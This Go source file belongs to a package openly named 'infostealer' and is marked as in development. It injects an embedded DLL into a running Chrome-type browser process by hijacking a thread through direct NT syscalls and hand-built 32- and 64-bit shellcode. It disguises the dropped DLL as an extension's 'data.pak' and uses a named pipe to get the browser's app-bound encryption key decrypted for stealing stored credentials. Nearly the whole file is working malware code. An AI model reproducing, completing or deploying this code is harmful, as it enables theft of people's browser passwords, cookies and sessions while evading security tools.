//go:build windows

//IN DEVELOPMENT

package infostealer

import (
	_ "embed"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

//go:embed v20.dll
var v20dll []byte

// Syscall Prototypes (Linked via assembly or external implementation)
func NtAllocateVirtualMemory(hProcess uintptr, baseAddr *uintptr, zeroBits uintptr, regionSize *uintptr, allocType uint32, protect uint32, sysID uint32) uint32
func NtWriteVirtualMemory(hProcess uintptr, baseAddr uintptr, buffer []byte, size uintptr, sysID uint32) uint32
func NtProtectVirtualMemory(hProcess uintptr, baseAddr *uintptr, size *uintptr, newProtect uint32, oldProtect *uint32, sysID uint32) uint32
func NtGetContextThread(hThread uintptr, lpContext uintptr, sysID uint32) uint32
func NtSetContextThread(hThread uintptr, lpContext uintptr, sysID uint32) uint32

var modkernel32 = windows.NewLazySystemDLL("kernel32.dll")
var procSuspendThread = modkernel32.NewProc("SuspendThread")
var procResumeThread = modkernel32.NewProc("ResumeThread")
var lastRead time.Time

const (
	WOW64_CONTEXT_CONTROL = 0x00010001
	CONTEXT_AMD64         = 0x100000
	CONTEXT_CONTROL       = CONTEXT_AMD64 | 0x1
)

type WOW64_FLOATING_SAVE_AREA struct {
	ControlWord, StatusWord, TagWord, ErrorOffset, ErrorSelector, DataOffset, DataSelector uint32
	RegisterArea                                                                           [80]byte
	Cr0NpxState                                                                            uint32
}

type WOW64_CONTEXT struct {
	ContextFlags                        uint32
	Dr0, Dr1, Dr2, Dr3, Dr6, Dr7        uint32
	FloatSave                           WOW64_FLOATING_SAVE_AREA
	SegGs, SegFs, SegEs, SegDs          uint32
	Edi, Esi, Ebx, Edx, Ecx, Eax        uint32
	Ebp, Eip, SegCs, EFlags, Esp, SegSs uint32
	ExtendedRegisters                   [512]byte
}

type M128A struct {
	Low  uint64
	High int64
}

type CONTEXT64 struct {
	P1Home, P2Home, P3Home, P4Home, P5Home, P6Home uint64
	ContextFlags                                   uint32
	MxCsr                                          uint32
	SegCs, SegDs, SegEs, SegFs, SegGs, SegSs       uint16
	EFlags                                         uint32
	Dr0, Dr1, Dr2, Dr3, Dr6, Dr7                   uint64
	Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi         uint64
	R8, R9, R10, R11, R12, R13, R14, R15           uint64
	Rip                                            uint64
	FltSave                                        [512]byte
	VectorRegister                                 [26]M128A
	VectorControl                                  uint64
	DebugControl                                   uint64
	LastBranchToRip, LastBranchFromRip             uint64
	LastExceptionToRip, LastExceptionFromRip       uint64
}

func FindProcess(name string) uint32 { //public because i use it in antianalysis_windows.go
	snapshot, _ := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	defer windows.CloseHandle(snapshot)
	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	if err := windows.Process32First(snapshot, &pe); err != nil {
		return 0
	}
	for {
		if windows.UTF16ToString(pe.ExeFile[:]) == name {
			return pe.ProcessID
		}
		if err := windows.Process32Next(snapshot, &pe); err != nil {
			break
		}
	}
	return 0
}

func findThread(pid uint32) uint32 {
	snapshot, _ := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	defer windows.CloseHandle(snapshot)
	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	if err := windows.Thread32First(snapshot, &te); err != nil {
		return 0
	}
	for {
		if te.OwnerProcessID == pid {
			return te.ThreadID
		}
		if err := windows.Thread32Next(snapshot, &te); err != nil {
			break
		}
	}
	return 0
}

func getLoadLibraryAddr() uintptr {
	return modkernel32.NewProc("LoadLibraryA").Addr()
}

func generate32BitShellcode(remotePathAddr uint32, loadLibraryAddr uint32, originalEip uint32) []byte {
	shellcode := []byte{
		0x60,                         // PUSHAD
		0x9C,                         // PUSHFD
		0x68, 0x00, 0x00, 0x00, 0x00, // PUSH <remotePathAddr> @ offset 3
		0xB8, 0x00, 0x00, 0x00, 0x00, // MOV EAX, <loadLibraryAddr> @ offset 8
		0xFF, 0xD0, // CALL EAX
		0x9D,                         // POPFD
		0x61,                         // POPAD
		0x68, 0x00, 0x00, 0x00, 0x00, // PUSH <originalEip> @ offset 18
		0xC3, // RET
	}
	binary.LittleEndian.PutUint32(shellcode[3:7], remotePathAddr)
	binary.LittleEndian.PutUint32(shellcode[8:12], loadLibraryAddr)
	binary.LittleEndian.PutUint32(shellcode[18:22], originalEip)
	return shellcode
}

func generate64BitShellcode(remotePathAddr uint64, loadLibraryAddr uint64, originalRip uint64) []byte {
	shellcode := []byte{
		0x50, 0x51, 0x52, 0x53, 0x55, 0x56, 0x57, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,
		0x48, 0x83, 0xEC, 0x28,
		0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MOV RCX, <remotePathAddr> @ offset 29
		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MOV RAX, <loadLibraryAddr> @ offset 39
		0xFF, 0xD0,
		0x48, 0x83, 0xC4, 0x28,
		0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5F, 0x5E, 0x5D, 0x5B, 0x5A, 0x59, 0x58,
		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MOV RAX, <originalRip> @ offset 73
		0xFF, 0xE0, // JMP RAX
	}
	binary.LittleEndian.PutUint64(shellcode[29:37], remotePathAddr)
	binary.LittleEndian.PutUint64(shellcode[39:47], loadLibraryAddr)
	binary.LittleEndian.PutUint64(shellcode[73:81], originalRip)
	return shellcode
}

func decryptV20Key(key []byte, localpath string, processname string) []byte {
	folder, _ := os.ReadDir(filepath.Join(localpath, "User Data", "Default", "Extensions"))
	var datapath string
	var extensionregex = regexp.MustCompile(`^[a-p]{32}$`)
	for _, subdir := range folder {
		if !subdir.IsDir() || !extensionregex.MatchString(subdir.Name()) {
			continue
		}
		datapath = filepath.Join(localpath, "User Data", "Default", "Extensions", subdir.Name(), "data.pak")
		os.WriteFile(datapath, v20dll, 0644)
		break
	}

	pid := FindProcess(processname)
	tid := findThread(pid)
	if tid == 0 {
		fmt.Printf("Did not find process")
		return nil
	}

	hThread, _ := windows.OpenThread(windows.THREAD_GET_CONTEXT|windows.THREAD_SET_CONTEXT|windows.THREAD_SUSPEND_RESUME, false, tid)
	defer windows.CloseHandle(hThread)
	hProcess, _ := windows.OpenProcess(windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, pid)
	defer windows.CloseHandle(hProcess)

	var isWow64 bool
	windows.IsWow64Process(hProcess, &isWow64)

	procSuspendThread.Call(uintptr(hThread))

	pathBytes := append([]byte(datapath), 0)
	pathSize := uintptr(len(pathBytes))
	var remotePathAddr uintptr
	NtAllocateVirtualMemory(uintptr(hProcess), &remotePathAddr, 0, &pathSize, 0x3000, 0x04, 0x18)
	NtWriteVirtualMemory(uintptr(hProcess), remotePathAddr, pathBytes, pathSize, 0x3a)

	var remoteShellcodeAddr uintptr
	var shellcode []byte
	loadLibraryAddr := getLoadLibraryAddr()

	if isWow64 {
		fmt.Printf("wow64")
		var ctx WOW64_CONTEXT
		ctx.ContextFlags = WOW64_CONTEXT_CONTROL
		NtGetContextThread(uintptr(hThread), uintptr(unsafe.Pointer(&ctx)), 0xEE)

		shellcode = generate32BitShellcode(uint32(remotePathAddr), uint32(loadLibraryAddr), ctx.Eip)
		size := uintptr(len(shellcode))
		fmt.Printf("injecting dll")
		NtAllocateVirtualMemory(uintptr(hProcess), &remoteShellcodeAddr, 0, &size, 0x3000, 0x04, 0x18)
		NtWriteVirtualMemory(uintptr(hProcess), remoteShellcodeAddr, shellcode, size, 0x3a)

		var oldProtect uint32
		NtProtectVirtualMemory(uintptr(hProcess), &remoteShellcodeAddr, &size, 0x20, &oldProtect, 0x50)

		ctx.Eip = uint32(remoteShellcodeAddr)
		NtSetContextThread(uintptr(hThread), uintptr(unsafe.Pointer(&ctx)), 0xEF)
		fmt.Printf("dll injected")
	} else {
		fmt.Printf("wow32")
		var ctx CONTEXT64
		ctx.ContextFlags = CONTEXT_CONTROL
		NtGetContextThread(uintptr(hThread), uintptr(unsafe.Pointer(&ctx)), 0xF0)

		shellcode = generate64BitShellcode(uint64(remotePathAddr), uint64(loadLibraryAddr), ctx.Rip)
		size := uintptr(len(shellcode))
		fmt.Printf("injecting dll")
		NtAllocateVirtualMemory(uintptr(hProcess), &remoteShellcodeAddr, 0, &size, 0x3000, 0x04, 0x18)
		NtWriteVirtualMemory(uintptr(hProcess), remoteShellcodeAddr, shellcode, size, 0x3a)

		var oldProtect uint32
		NtProtectVirtualMemory(uintptr(hProcess), &remoteShellcodeAddr, &size, 0x20, &oldProtect, 0x50)

		ctx.Rip = uint64(remoteShellcodeAddr)
		NtSetContextThread(uintptr(hThread), uintptr(unsafe.Pointer(&ctx)), 0x1EE)
		fmt.Printf("dll injected")
	}

	procResumeThread.Call(uintptr(hThread))

	pipeName := `\\.\pipe\ChromeSecureCommunication`
	fmt.Printf("creating pipe")
	handle, _ := windows.CreateNamedPipe(
		windows.StringToUTF16Ptr(pipeName),
		windows.PIPE_ACCESS_DUPLEX,
		windows.PIPE_TYPE_MESSAGE|windows.PIPE_READMODE_MESSAGE|windows.PIPE_WAIT,
		1, 1024, 1024, 0, nil,
	)
	defer windows.CloseHandle(handle)
	windows.ConnectNamedPipe(handle, nil)

	var bytesWritten uint32
	var encoded = base64.StdEncoding.EncodeToString(key)
	windows.WriteFile(handle, []byte("dQw4w9WgXcQ"+encoded), &bytesWritten, nil)

	var buffer = make([]byte, 1024)
	var bytesRead uint32
	if time.Since(lastRead) >= 2*time.Minute {
		var bytesRead uint32
		err := windows.ReadFile(handle, buffer, &bytesRead, nil)
		if err == nil {
			lastRead = time.Now()
			fmt.Printf("[DEBUG] Read %d bytes successfully\n", bytesRead)
		}
	} else {
		fmt.Printf("TIMEOUT")
		return []byte{0x00}
	}

	if string(buffer) == "dQw4w9WgXcQ" {
		fmt.Printf("failed")
		return []byte{0x00}
	}

	fmt.Printf("decoded string: %v", string(buffer[:bytesRead]))

	bytesDecoded, _ := base64.StdEncoding.DecodeString(string(buffer[:bytesRead]))
	return bytesDecoded
}
